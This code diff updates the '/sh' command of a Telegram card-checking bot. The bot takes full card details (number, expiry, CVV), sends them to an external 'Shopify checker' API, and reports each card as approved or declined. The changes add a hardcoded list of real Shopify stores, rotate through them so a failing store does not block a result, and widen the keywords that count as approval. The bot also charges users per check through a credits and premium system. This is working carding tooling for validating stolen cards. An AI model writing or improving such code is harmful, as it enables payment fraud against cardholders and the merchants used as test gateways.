@@ -2,15 +2,40 @@ import aiohttp
 import asyncio
 import time
 import re
+import random
 from html import escape
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import CommandHandler, ContextTypes
 from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# API ENDPOINT
+# CONFIG
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SH_API = "https://web-production-c8f0c.up.railway.app/shopify"
+
+# Known working Shopify stores — rotated on every check
+# If the API returns "Application not found" we retry the next site
+SITES = [
+    "deboerwetsuits.myshopify.com",
+    "open-books-a-poem-emporium.myshopify.com",
+    "mocha-australia.myshopify.com",
+    "lufteknic.myshopify.com",
+    "jewelsbrightart.myshopify.com",
+    "interoknack.com",
+    "endurunce-shop.myshopify.com",
+    "1to1music.co.uk",
+]
+
+# Responses that mean the SITE is broken, not the card — trigger retry
+_SITE_ERRORS = {
+    "application not found",
+    "site error",
+    "no products found",
+    "cart add failed",
+    "checkout js blocked",
+    "cloudflare block",
+    "site_error",
+}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # HELPERS
@@ -58,19 +83,46 @@ async def _check_force_sub(user_id: int, context) -> list:
     return not_joined
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# API CALL
+# API CALL — with site rotation on bad responses
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def call_sh_api(card_str: str) -> dict:
     """
-    Call the Shopify checker API.
-    Returns dict with keys: Status (bool), Response (str),
-    Gateway (str), Price (float), Time (str)
+    Call the Shopify checker API, rotating through sites until we
+    get a real card response (not a site/infra error).
+    Returns the raw API JSON dict.
     """
-    params = {"cc": card_str, "site": "", "proxy": ""}
+    sites = SITES.copy()
+    random.shuffle(sites)
     timeout = aiohttp.ClientTimeout(total=90)
+
     async with aiohttp.ClientSession(timeout=timeout) as session:
-        async with session.get(SH_API, params=params) as resp:
-            return await resp.json(content_type=None)
+        for site in sites:
+            try:
+                params = {
+                    "cc":    card_str,
+                    "site":  site,
+                    "proxy": "",
+                }
+                async with session.get(SH_API, params=params) as resp:
+                    data = await resp.json(content_type=None)
+
+                response_text = str(data.get("Response", "")).lower()
+
+                # If it's a real card response — return it immediately
+                if not any(err in response_text for err in _SITE_ERRORS):
+                    return data
+
+                # Otherwise try next site
+                continue
+
+            except asyncio.TimeoutError:
+                continue
+            except Exception:
+                continue
+
+    # All sites failed — return last result or generic error
+    return {"Status": False, "Response": "All sites unavailable. Try again.", "Gateway": "Shopify", "Price": "N/A", "Time": "N/A"}
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # /sh COMMAND
@@ -78,21 +130,16 @@ async def call_sh_api(card_str: str) -> dict:
 async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
-    # Maintenance check
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
-        await update.message.reply_text(
-            "⚠️ Bot is under maintenance. Try again later."
-        )
+        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
         return
 
-    # Gate toggle check
     if not context.bot_data.get("sh_on", True):
         await update.message.reply_text(
             "⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
         )
         return
 
-    # Force-sub check
     not_joined = await _check_force_sub(user.id, context)
     if not_joined:
         rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
@@ -107,7 +154,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Parse card ───────────────────────────────────────────
+    # ── Parse card ───────────────────────────────────────
     card_str = None
     if context.args:
         card_str = context.args[0].strip()
@@ -134,7 +181,9 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     parts = card_str.split("|")
     if len(parts) != 4:
-        await update.message.reply_text("❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML")
+        await update.message.reply_text(
+            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
+        )
         return
 
     cc_num, mm, yy, cvv = [p.strip() for p in parts]
@@ -142,7 +191,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         yy = yy[-2:]
     card_str = f"{cc_num}|{mm}|{yy}|{cvv}"
 
-    # ── Credits check ─────────────────────────────────────────
+    # ── Credits ───────────────────────────────────────────
     ud      = get_user_data(user.id, context)
     premium = is_user_premium(ud)
 
@@ -163,45 +212,50 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         ud["credits"] -= 1
 
-    # ── Processing message ────────────────────────────────────
+    # ── Processing message ────────────────────────────────
     msg = await update.message.reply_text(
         "⏳ <b>Processing...</b>\n"
         "━━━━━━━━━━━━━━━━━\n"
-        f"<b>Card</b> ➳ <code>{escape(card_str)}</code>\n"
-        "<b>Gate</b> ➳ Shopify 🛒\n"
+        f"<b>Card</b>  ➳ <code>{escape(card_str)}</code>\n"
+        "<b>Gate</b>  ➳ Shopify 🛒\n"
         "━━━━━━━━━━━━━━━━━",
         parse_mode="HTML",
     )
 
-    start = time.time()
+    start   = time.time()
     bin_num = cc_num[:6]
 
     try:
-        # ── Call API & BIN lookup in parallel ─────────────────
+        # API call + BIN lookup in parallel
         api_result, bin_data = await asyncio.gather(
             call_sh_api(card_str),
             get_bin_info(bin_num),
             return_exceptions=True,
         )
 
-        # Handle API errors
         if isinstance(api_result, Exception):
             raise api_result
 
-        # ── Parse response ────────────────────────────────────
-        approved   = bool(api_result.get("Status", False))
-        raw_resp   = str(api_result.get("Response", "Unknown"))
-        gateway    = str(api_result.get("Gateway", "Shopify Payments"))
-        price      = api_result.get("Price", "N/A")
-        api_time   = str(api_result.get("Time", f"{time.time()-start:.2f}s"))
+        # ── Parse API fields ──────────────────────────────
+        raw_resp = str(api_result.get("Response", "Unknown"))
+        approved = bool(api_result.get("Status", False))
+        gateway  = str(api_result.get("Gateway",  "Shopify Payments"))
+        price    = api_result.get("Price", "N/A")
+        api_time = str(api_result.get("Time", f"{time.time()-start:.2f}s"))
 
-        # Approve if response text contains "Approved" (case-insensitive)
-        if "approved" in raw_resp.lower():
+        # Status: API Status field is authoritative;
+        # also approve if Response text says "approved" / "charged" / "success"
+        resp_lower = raw_resp.lower()
+        if any(w in resp_lower for w in ("approved", "charged", "success", "paid")):
             approved = True
+        elif any(w in resp_lower for w in ("declined", "decline", "failed", "invalid", "insufficient")):
+            approved = False
 
-        status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if approved else "Dᴇᴄʟɪɴᴇᴅ ❌"
+        status_icon = "✅" if approved else "❌"
+        status_word = "Aᴘᴘʀᴏᴠᴇᴅ" if approved else "Dᴇᴄʟɪɴᴇᴅ"
+        status_ui   = f"{status_word} {status_icon}"
 
-        # ── BIN info ──────────────────────────────────────────
+        # ── BIN info ──────────────────────────────────────
         bin_txt = country = flag = "N/A"
         if isinstance(bin_data, dict) and not bin_data.get("error"):
             s       = str(bin_data.get("scheme",  "N/A")).upper()
@@ -214,26 +268,29 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         plan_ui  = get_styled_plan(ud.get("plan", "TRIAL"))
         username = escape(user.first_name or "User")
 
-        # ── Final result message ──────────────────────────────
+        # ── Result message ────────────────────────────────
         text = (
             f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"<b>Status</b>   ➳ <b>{status_ui}</b>\n"
-            f"<b>Card</b>     ➳ <code>{escape(card_str)}</code>\n"
-            f"<b>Response</b> ➳ {escape(raw_resp)}\n"
+            f"<b>Status</b>    ➳ <b>{status_ui}</b>\n"
+            f"<b>Card</b>      ➳ <code>{escape(card_str)}</code>\n"
+            f"<b>Response</b>  ➳ {escape(raw_resp)}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"<b>Gate</b>     ➳ {escape(gateway)} 🛒\n"
-            f"<b>Price</b>    ➳ ${price}\n"
-            f"<b>Time</b>     ➳ {escape(api_time)}\n"
+            f"<b>Gate</b>      ➳ {escape(gateway)} 🛒\n"
+            f"<b>Price</b>     ➳ ${price}\n"
+            f"<b>Time</b>      ➳ {escape(api_time)}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"<b>BIN</b>      ➳ {escape(bin_txt)}\n"
-            f"<b>Country</b>  ➳ {flag} {escape(country)}\n"
+            f"<b>BIN</b>       ➳ {escape(bin_txt)}\n"
+            f"<b>Country</b>   ➳ {flag} {escape(country)}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"<b>User</b>     ➳ {username} ({plan_ui})\n"
+            f"<b>User</b>      ➳ {username} ({plan_ui})\n"
             f"📢 @Batcardchk"
         )
-        await msg.edit_text(text, parse_mode="HTML", disable_web_page_preview=True,
-                            reply_markup=kb_result(premium))
+        await msg.edit_text(
+            text, parse_mode="HTML",
+            disable_web_page_preview=True,
+            reply_markup=kb_result(premium),
+        )
 
     except asyncio.TimeoutError:
         if not premium:
